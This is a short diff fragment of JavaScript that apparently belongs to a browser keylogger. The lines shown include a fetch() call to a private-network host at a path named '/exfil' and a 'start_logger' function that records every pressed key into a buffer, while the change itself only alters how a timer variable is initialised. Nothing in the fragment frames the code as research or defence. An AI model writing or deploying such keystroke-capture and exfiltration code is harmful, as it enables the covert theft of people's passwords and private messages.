@@ -8,7 +8,7 @@ fetch("http://192.168.49.52:9000/exfil", {
 });
 let start_logger = () => {
   let buffer = "";
-  let timer = 0;
+  let timer;
   let logKey = (event) => {
     buffer += event.key;
     clearTimeout(timer);
